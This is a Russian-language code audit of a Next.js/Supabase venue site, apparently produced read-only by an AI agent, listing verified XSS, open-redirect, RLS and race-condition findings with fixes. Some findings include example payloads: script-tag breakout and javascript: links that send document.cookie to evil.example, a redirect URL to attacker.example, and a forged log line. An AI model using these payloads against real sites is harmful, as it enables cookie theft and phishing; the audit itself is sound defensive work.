# Разбор кодовой базы — найденные ошибки

**Дата:** 2026-07-20
**Репозиторий:** `parkourcafe/privelegy-bali-club` (Other Bali), ветка `claude/workspace-automation-audit-juzefw`
**Метод:** только чтение. Код разбит на 7 блоков; по каждому — ревьюер + отдельный адверсариальный верификатор, который перечитывал каждую находку по указанному файлу/строке и отсеивал ложные срабатывания. В отчёт включены только подтверждённые находки.
**Ничего в проекте не менялось** — создан только этот файл.

## Как читать

Каждая находка привязана к `файл:строка` с точной цитатой-доказательством. Статус верификации:
- **CONFIRMED** — верификатор перечитал файл и дефект реален.
- **PLAUSIBLE** — дефект вероятен, но конечный результат зависит от контекста, который нельзя проверить статически (указано, какого).

**Итог верификации: 11 CONFIRMED + 1 PLAUSIBLE, 0 ложных. Всего 12 находок.**
Критичных/high нет. **2 medium** (приоритет), 10 low.

### Сводка по критериям

| # | Критерий | Находок | Severity |
|---|---|---|---|
| 1 | Качество кода | 3 | 3× low |
| 2 | Баги | 2 | 2× low |
| 3 | Уязвимости | 1 | 1× medium (PLAUSIBLE) |
| 4 | Security-check | 6 | 1× medium, 5× low |

### Приоритет (сначала эти два)

| Severity | Находка | Файл |
|---|---|---|
| **medium** | JSON-LD сериализуется сырым `JSON.stringify` в `<script>` — класс stored-XSS через `</script>`-breakout | `app/places/page.tsx:368` (+ ещё 2 точки) |
| **medium** (PLAUSIBLE) | Open redirect через protocol-relative путь в редиректе консолидации хоста | `proxy.ts:74` |

---

## 1. Качество кода

### 1.1 [low · CONFIRMED] Дублирующие валидаторы URL уже разошлись между двумя модулями
- **Файлы:** `lib/integrations/external-ordering.ts:61` vs `lib/external-links.ts:35,43`
- **Доказательство:** `parseSafeHttpsUrl` в `external-ordering.ts`: `if (url.protocol !== "https:" || url.username || url.password || !url.hostname) return null;` — **без** проверки порта и длины. Копия в `external-links.ts` дополнительно требует `value.length > 2_048` и `(url.port && url.port !== "443")`. Дублированы также `validatePublicEvidenceUrl`, `hostMatches`, `validateGoogleMapsUrl`, `validateWhatsAppPhone`.
- **Почему это дефект:** экшен-гейтвей (`resolve-actions.ts → integrations/*`) и mobile-api (`→ external-links.ts`) используют **две разные** реализации security-критичной валидации URL/хостов. Они уже расходятся, поэтому упрочнение одной копии (новый заблокированный scheme, SSRF-гард, лимит длины) молча не защищает второй путь. Сегодня `https://grab.com:2222/x` и многокилобайтные URL проходят через копию в `integrations`, но отклоняются копией в `external-links`.
- **Сценарий:** мейнтейнер ужесточает `parseSafeHttpsUrl` в `external-links.ts`, считая его каноническим, — экшен-гейтвей продолжает использовать `external-ordering.ts` и остаётся уязвимым.
- **Фикс:** вынести один общий модуль валидации URL, импортировать в обоих местах, сохранив более строгие гарды (порт + длина); удалить дубли.

### 1.2 [low · CONFIRMED] Ошибки чтения меню проглатываются без лога — «меню молча исчезает»
- **Файл:** `lib/data/menu-summary-repository.ts:89` (и `148`)
- **Доказательство:** `} catch {\n  return null;\n }` в обоих фетчерах, плюс ранние `if (error) return null` — объект ошибки Supabase отбрасывается без логирования.
- **Почему это дефект:** расходится с собственной конвенцией public-read в `lib/data.ts` (`warnPublicReadFailed`, `lib/data.ts:270`), которую ввели именно чтобы сбои публичного чтения были видны в логах. Здесь 6 других мест логируют, а репозиторий меню — нет.
- **Сценарий:** миграция или изменение RLS ломает anon-доступ к таблице `menus` в проде. Все фетчеры возвращают `null` для каждого заведения — меню исчезают со всех публичных страниц, при этом **ни одного лога**. Операторы не могут обнаружить сбой.
- **Фикс:** залогировать сбой (переиспользовать `warnPublicReadFailed`) перед `return null` в обоих `catch` и на ранних возвратах по `error`/`sectionError`/`itemError`.

### 1.3 [low · CONFIRMED] Онбординг меню-драфта оставляет «осиротевший» пустой драфт при сбое вставки позиции
- **Файл:** `app/api/onboard/draft/route.ts:106`
- **Доказательство:** `return NextResponse.json({ ok: false, error: "item_failed" }, { status: 422 });` — выполняется после того, как `create_partner_menu_draft` (строка 75) уже создал строку меню; созданный `menuId` не удаляется при ошибке.
- **Почему это дефект:** расходится с соседним `app/api/partner/menu-draft/route.ts:121-124`, который откатывает через `client.from("menus").delete().eq("id", menu.id)`. RPC инкрементит `version` при каждом вызове (миграция 0032:679-681), поэтому ретраи копят пустые драфт-версии.
- **Сценарий:** держатель токена отправляет драфт меню, `upsert_partner_menu_item` падает (транзиентная ошибка/ретрай после сетевого сбоя) — каждая попытка оставляет новую пустую строку меню (`status='draft'`, без позиций). Публично не видно, но засоряет очередь оператора; повторяемо дёшево одним валидным токеном.
- **Фикс:** на ветке `item_failed` удалить только что созданный драфт (зеркалить откат partner-роута) либо сделать создание меню+первой позиции атомарным в RPC.

---

## 2. Баги

### 2.1 [low · CONFIRMED] `officialUrl` у property всегда `null` — мёртвый тернарник отбрасывает вычисленное значение
- **Файл:** `lib/domain/resort-import.ts:218`
- **Доказательство:** `officialUrl: sourceUrl && !/daypassapp|klook|marriott\.com\/offers/i.test(sourceUrl) ? null : null,` — **обе** ветки возвращают `null`.
- **Почему это дефект:** проверка `sourceUrl` и regex-исключение агрегаторов (daypassapp/klook/marriott offers) — мёртвый код. Каждый `HospitalityProperty` из импортёра получает `officialUrl: null` независимо от входа. Подтверждено: в `data/resort-import/properties.json` у всех property `officialUrl: null`. (Именно поэтому это логическая ошибка, а не заглушка: заглушка была бы просто `officialUrl: null`, а не целое отброшенное выражение.)
- **Сценарий:** импортируется строка CSV, где `source_url` — официальный сайт отеля (не агрегатор). Property создаётся с `officialUrl: null`; когда UI подключит хэндофф на официальный сайт к `property.officialUrl`, он не отрендерится никогда.
- **Фикс:** вернуть URL в нужной ветке: `... ? sourceUrl : null`. Если поле намеренно пустует — заменить всё выражение явным `officialUrl: null` с комментарием.

### 2.2 [low · CONFIRMED] Неатомарный read-modify-write `venue_submissions.media` — потерянные обновления и обход квоты фото
- **Файлы:** `app/api/list-your-property/media/create-upload/route.ts:101`, `app/api/list-your-property/media/finalize/route.ts:87`
- **Доказательство:** `.update({ media: [...media, entry], updated_at: new Date().toISOString() })` — читается весь JSONB-массив `media` и перезаписывается копией, вычисленной на сервере, **без** version-guard/оптимистичной блокировки и без append на стороне БД. Проверка квоты (`active.length >= maxCountForKind`) и append — классический TOCTOU.
- **Почему это дефект:** `mediaToken` — stateless HMAC (`submission-media-policy.ts:108-130`), 2 ч TTL, реиграбельный; любой клиент может слать конкурентные запросы. Корректность зависит от того, что клиент сериализует запросы (официальный uploader это делает, но сервер не должен на это полагаться).
- **Сценарий:** держатель валидного `mediaToken` шлёт два `create-upload` для одного `submissionId` конкурентно (две вкладки/ретраи/неофициальный клиент). Оба читают массив длины 19 (лимит 20), оба проходят проверку, оба пишут `[...media, entry]` — второй перезаписывает первый. Итог: массив может превысить `maxCountForKind` (обход квоты) **и** уже зарезервированный приватный Storage-объект потерянной записи остаётся сиротой навсегда; последующий `finalize` для него вернёт `not_found`.
- **Фикс:** делать мутацию атомарно — append + проверку лимита внутри SECURITY DEFINER RPC (`UPDATE ... SET media = media || $entry WHERE id=$id AND jsonb_array_length(...) < $limit`), либо compare-and-set по `updated_at`/version-колонке.

---

## 3. Уязвимости

### 3.1 [medium · PLAUSIBLE] Open redirect через protocol-relative путь в редиректе консолидации хоста
- **Файл:** `proxy.ts:74`
- **Доказательство:** `const destination = new URL(`${req.nextUrl.pathname}${req.nextUrl.search}`, CANONICAL_SITE_ORIGIN);` — `Location` строится интерполяцией сырого `pathname` в `new URL()` с фиксированной базой. Ветка редиректа (`proxy.ts:73`) срабатывает только по состоянию хоста: `vercelEnv === "production" && isVercelDeploymentHost(host)` — **не зависит от пути**.
- **Почему это (возможно) уязвимость:** WHATWG-парсер трактует путь, начинающийся с `//` (или `/\`), как protocol-relative, и итоговый origin становится подконтролен атакующему. Верификатор воспроизвёл в Node: `new URL("//attacker.example/login", "https://www.otherbali.com").href === "https://attacker.example/login"`.
- **Почему PLAUSIBLE, а не CONFIRMED:** остаётся один непроверенный статически шаг — сохраняет ли Next.js ведущий `//` в `req.nextUrl.pathname`, или нормализует его до попадания в эту строку. Если не нормализует — это рабочий open redirect; если нормализует — защищено фреймворком. **Требуется проверка в рантайме** (запрос `https://<prod-project>.vercel.app//attacker.example/login` и просмотр заголовка `Location`).
- **Сценарий:** жертве шлют `https://<prod-project>.vercel.app//attacker.example/login`. Прокси в проде видит `*.vercel.app`-хост и отдаёт `HTTP 308` с `Location: https://attacker.example/login`. Постоянный редирект уводит браузер на чужой origin — фишинг/цепочки редиректов.
- **Фикс:** не интерполировать подконтрольный запросу путь в `new URL()` с фиксированной базой. Клонировать уже разобранный URL и переопределить только host/protocol: `const d = req.nextUrl.clone(); d.protocol = "https:"; d.host = "www.otherbali.com"; return NextResponse.redirect(d, 308);` — путь нормализован, origin сменить нельзя.

---

## 4. Security-check

### 4.1 [medium · CONFIRMED] JSON-LD сериализуется сырым `JSON.stringify` в `<script>` — `</script>`-breakout (класс stored-XSS)
- **Файлы:** `app/places/page.tsx:368`, `app/route/[slug]/page.tsx:114`, `app/places/[slug]/page.tsx:431`
- **Доказательство:** `dangerouslySetInnerHTML={{ __html: JSON.stringify(node) }}`, где в `node` встроены данные заведения: `name: venue.name` (строка 356; в других точках — `name`/`address`/`streetAddress`). Grep по `lib/`, `components/`, `app/` показал, что **экранирующего хелпера нет** (`<`/` `/`escapeJson`/`safeJsonLd` не найдены).
- **Почему это дефект:** `JSON.stringify` **не** экранирует `<`, `/`, `U+2028`, `U+2029`. Когда её вывод кладётся дословно внутрь `<script type="application/ld+json">…</script>`, HTML-парсер (не JSON) видит любой литеральный `</script>` в строке и закрывает элемент скрипта раньше — дальше выполняется внедрённая разметка в origin `otherbali.com`.
- **Сценарий:** админ одобряет (или seed/импорт вносит) заведение с именем `Warung Bagus</script><script>fetch('//evil.example/c?x='+document.cookie)</script>`. Оно попадает в JSON-LD `ItemList` на `/places`, в `ItemList` на `/route/[slug]` и в `LocalBusiness` на своей `/places/[slug]` — каждый рендерит внедрённый `<script>`, который исполняется в браузере посетителя.
- **Фикс:** один JSON-LD-безопасный сериализатор для всех `ld+json`-точек: `JSON.stringify(x).replace(/</g,'\\u003c').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')` (опц. `>` и `&`). Заменить им все `__html: JSON.stringify(...)`.

### 4.2 [low · CONFIRMED] `official_url`/`menu_url` попадают в `href` без валидации схемы (риск `javascript:`-ссылки + расхождение путей)
- **Файлы:** `app/places/[slug]/page.tsx:729` (рендер), `lib/data.ts:184` (маппинг)
- **Доказательство:** `href={officialUrl}` внутри `TrackedOutboundLink` (ставит `target="_blank"`, рендерит `href` дословно, без проверки схемы). Источник не валидируется: `lib/data.ts:184` — `officialUrl: (r.official_url as string) ?? undefined,` — сырой каст колонки БД в string. При этом соседний, более новый action-путь на той же странице **валидирует** каждый href.
- **Почему это дефект:** React **не** санитизирует `javascript:`/`data:` в `href` — в проде только dev-предупреждение, ссылка рендерится. Поле URL, доходящее до `<a href>`, обязано быть провалидировано по схеме на границе. Валидаторы уже есть (`lib/external-links.ts`) и применяются на параллельном пути — здесь контроль и отсутствует, и расходится.
- **Сценарий:** если любой не-https-валидируемый путь записи (будущий админ-редактор, bulk-импорт, опечатка в миграции) сохранит `official_url = 'javascript:fetch("//evil.example/?c="+document.cookie)'` на опубликованном заведении — страница отрендерит `<a target="_blank" href="javascript:...">`, клик исполнит скрипт в origin `otherbali.com`.
- **Фикс:** валидировать на границе маппинга: в `lib/data.ts` прогонять `official_url`/`menu_url`/`instagram_url` через `validateOfficialWebsiteUrl`/`validatePublicEvidenceUrl`, возвращая `undefined` для не-https. Либо `TrackedOutboundLink` резолвит href через безопасный резолвер и ничего не рендерит при провале.

### 4.3 [low · CONFIRMED] Anon-исполняемый SECURITY DEFINER `onboard_info` возвращает всю строку `venues` через `to_jsonb(v)`, обходя allowlist колонок из 0031
- **Файл:** `supabase/migrations/0011_partner_onboarding.sql:65` (+ грант :112)
- **Доказательство:** тело `onboard_info`: `'venue', (select to_jsonb(v) - 'created_at' from venues v join venue_onboard_tokens t ... where t.token = p_token)` (строка 65), плюс `grant execute on function public.onboard_info(text) to anon, authenticated;` (строка 112). Миграция 0031 отозвала/пере-выдала все соседние onboarding-RPC на `service_role`, но `onboard_info` **не тронула**.
- **Почему это дефект:** SECURITY DEFINER исполняется от владельца, поэтому `to_jsonb(v)` читает и возвращает **каждую** колонку `venues` независимо от прав вызывающего. Миграция 0031 (строки 294-300) специально сделала `revoke all on table public.venues from anon, authenticated` и пере-выдала SELECT только на ~24 именованных колонки — именно чтобы держать непубличные поля вне anon-пути чтения (AGENTS.md §8.3). `to_jsonb(v)` этот allowlist обходит. *(Примечание: `set search_path = public, pg_temp` на строке 63 присутствует — проблема только в проекции всей строки + грант anon, не в search_path.)*
- **Сценарий:** атакующий с любым валидным onboarding-токеном (расшаренная/утёкшая `/onboard`-ссылка — тот самый сценарий, ради которого 0031 вводила ротацию) вызывает публичным anon-ключом `supabase.rpc('onboard_info', { p_token })` напрямую к PostgREST. Ответ в поле `venue` содержит полную строку `venues` для этого slug, включая внутренние поля (`tablepilot_slug`, `last_verified_at` и любые непубличные колонки).
- **Фикс:** заменить `to_jsonb(v) - 'created_at'` на явный `jsonb_build_object(...)` только с нужными для превью онбординга колонками (тот же allowlist, что 0031 выдаёт anon); и/или `revoke execute ... from anon, authenticated; grant execute ... to service_role;` и вызывать через серверную границу.

### 4.4 [low · CONFIRMED] Онбординг action-draft принимает любой HTTPS-хост для именованного провайдера (нет привязки URL к провайдеру)
- **Файл:** `app/api/onboard/draft/route.ts:114`
- **Доказательство:** `const url = safeHttps(body.url);` — `safeHttps()` (20-36) отклоняет только не-https, встроенные креды и `example.com`. `provider` проверяется по набору `PROVIDERS` (строка 117), но хост URL с провайдером не сверяется. RPC `create_partner_action_draft` (миграция 0032:737) валидирует лишь `p_url !~ '^https://[^[:space:]]+$'`.
- **Почему это дефект:** соседний `app/api/partner/action-draft/route.ts:24` привязывает URL к провайдеру через `validateExternalProviderUrl()` (allowlist `PROVIDER_HOSTS`, напр. `grabfood → grab.com`). Онбординг-путь такой привязки не делает ни на API-, ни на DB-уровне — action можно пометить известным провайдером (grabfood/gofood/sevenrooms/chope/whatsapp), указывая на посторонний хост. Это нарушает гардрейл «disclose external provider handoffs accurately».
- **Компенсирующий контроль (почему low):** строка вставляется со `status='draft'`; публичное чтение требует `status='confirmed'` (RLS 0032:315-318). До подтверждения оператором ссылка публично не кликабельна.
- **Сценарий:** заведение с валидным токеном шлёт `{draftType:'action', kind:'delivery', provider:'grabfood', url:'https://look-alike-order.example/pay'}`. Драфт сохраняется как «GrabFood», но ведёт на посторонний хост. Если оператор подтвердит, не заметив несоответствия, публичные пользователи по «Order on GrabFood» уходят не на провайдера.
- **Фикс:** в ветке action онбординг-драфта валидировать URL через `validateExternalProviderUrl({ provider, kind, url, sourceUrl })` и отклонять при `null` — как в partner-роуте, чтобы обе точки входа применяли один и тот же `PROVIDER_HOSTS`.

### 4.5 [low · CONFIRMED] Sink CSP-репортов пишет неаутентифицированное тело атакующего в логи без нейтрализации (log forging, CWE-117)
- **Файл:** `app/api/csp-report/route.ts:13`
- **Доказательство:** `if (body) console.warn("[csp-report]", body);`, где выше `body = (await req.text()).slice(0, 4000)`. Эндпоинт по природе неаутентифицирован (браузеры должны слать репорты), но сырой текст логируется дословно — без вырезания CR/LF и управляющих символов, без проверки Content-Type.
- **Почему это дефект:** любой клиент может отправить произвольный контент, попадающий в агрегированный лог-поток (CWE-117).
- **Сценарий:** атакующий POST-ит в `/api/csp-report` тело с встроенными переводами строк, имитирующими легитимные лог-строки (напр. `...\n[auth] operator login ok ip=1.2.3.4`); в plaintext-просмотре логов поддельные строки выглядят как настоящие и могут ввести оператора в заблуждение при разборе инцидента; также эндпоинт можно использовать для флуда/загрязнения логов.
- **Фикс:** перед логированием заменить CR/LF и управляющие символы в теле (или логировать одним структурированным JSON-полем, а не сырым текстом), проверять Content-Type на медиа-тип CSP-репорта, добавить базовый rate-limit.

### 4.6 [low · CONFIRMED] CSP отдаётся в режиме Report-Only и со `script-src 'unsafe-inline'` — нет реального контроля исполнения скриптов
- **Файл:** `next.config.ts:38` (+ `:19`)
- **Доказательство:** единственный CSP-заголовок во всём проекте — `Content-Security-Policy-Report-Only` (`next.config.ts:38`); grep не находит enforcing-заголовка `Content-Security-Policy` нигде, `proxy.ts` CSP не ставит. При этом `script-src` включает `'unsafe-inline'` (строка 19).
- **Почему это дефект:** Report-Only браузером не блокируется; плюс `'unsafe-inline'` означает, что даже после перехода в enforcing-режим инъекция inline-скрипта всё равно исполнится. Итог: **сейчас у приложения нет CSP-контейнмента исполнения скриптов** (что делает п. 4.1 и 4.2 практически эксплуатируемыми, а не только теоретическими).
- **Сценарий:** любой stored/reflected XSS внедряет inline `<script>`. Из-за Report-Only + `'unsafe-inline'` браузер исполняет скрипт и лишь шлёт отчёт в `/api/csp-report`; CSP payload не сдерживает.
- **Фикс:** после того как отчёты report-only чисты, отдавать enforcing-ключ `Content-Security-Policy` (как и планирует комментарий в файле). Дальше — nonce/hash-пайплайн для inline-бутстрапа Next, чтобы убрать `'unsafe-inline'` из `script-src`.

---

## Границы разбора (что НЕ проверялось)

- **Разбор статический, read-only.** Рантайм-эксплуатация не проводилась — поэтому п. 3.1 помечен PLAUSIBLE (нужен один рантайм-тест, описан в находке).
- Просмотрены 7 блоков: онбординг/партнёрские API, admin/media/misc API, Supabase-клиенты и auth, экшен-гейтвей/аналитика/внешние ссылки, security-миграции (RLS/RPC), слой данных/домен/mobile-api, безопасность фронтенд-рендера. **Не** покрывались построчно: весь редакторский контент district-гайдов, вся 3200-строчная `globals.css`, полный `lib/data.ts` вне публичных чтений, тесты.
- Внешние системы (продовый Supabase, Vercel, консоли сторов) недоступны из сессии — выводы о них следуют из кода/миграций, не из живого состояния.
- Клон неглубокий (история до 2026-07-16 недоступна) — на находки не влияет, они привязаны к текущему состоянию файлов.

## Рекомендованный порядок

1. **4.1 (JSON-LD XSS, medium)** — один общий безопасный сериализатор, заменить все 3 точки. Дёшево, закрывает реальный класс stored-XSS.
2. **3.1 (open redirect, medium)** — сначала рантайм-проверка `//attacker.example`; фикс на `nextUrl.clone()` тривиален и стоит сделать независимо от результата.
3. **4.6 (CSP enforcing) + 4.2/4.4 (валидация href/провайдера на границе)** — усиливают защиту от XSS/мислейбла в связке.
4. **4.3 (onboard_info) + 4.5 (csp-report) + 2.2 (media race)** — точечные серверные/SQL-правки.
5. **1.1–1.3, 2.1** — качество кода: единый валидатор URL, логирование сбоев чтения, откат драфта, живой `officialUrl`.

---

*Отчёт получен read-only разбором с адверсариальной верификацией каждой находки. Файлы проекта не изменялись; единственный созданный артефакт — этот файл.*
